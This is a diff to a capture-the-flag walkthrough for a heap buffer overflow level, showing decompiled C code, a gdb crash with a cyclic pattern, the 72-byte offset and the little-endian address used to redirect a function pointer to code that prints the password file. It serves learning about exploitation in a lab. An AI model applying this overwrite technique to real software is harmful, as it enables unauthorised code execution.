@@ -1,4 +1,48 @@
 ```
+    int n()
+    {
+        return system("/bin/cat /home/user/level7/.pass");
+    }
+
+    int m()
+    {
+        return puts("Nope");
+    }
+
+    int main(int argc, char** argv, char** envp) 
+    {
+        char* user_input = malloc(64);
+
+        int (**function_ptr)() = malloc(sizeof(void*));
+
+        *function_ptr = m;
+
+        strcpy(user_input, argv[1]);
+
+        return (*function_ptr)();
+    }
+```
+
+The program allocates two things on the heap: a 64 byte input buffer and a 4 byte function pointer.
+
+The function pointer point to a function m() that print "Nope".
+
+If we overflow the input buffer we can overwrite the function pointer with the address of function n() that print the flag.
+
+```
+    (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+    Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x41346341 in ?? ()
+    (gdb) 
+
+```
+
+the offset is 72
+
+the address of n()
+```
     (gdb) info functions
     All defined functions:
 
@@ -30,17 +74,13 @@
     (gdb) 
 ```
 
-the address of function n() is => 0x08048454  n => \x54\x84\x08\x00
+the address of function n() is => 0x08048454  in little-indian \x54\x84\x08\x00
 
 we gone do Heap-based Buffer Overflow
 
 we need to overflow more than just 64 bytes to reach function_ptr.
 
-Usually it's something like:
-
-64 bytes for user_input
-
-+8 bytes of malloc metadata for the next chunk
+64 bytes for user_input + 8 bytes of malloc metadata for the next chunk = 72
 
 then the function pointer is there.
 
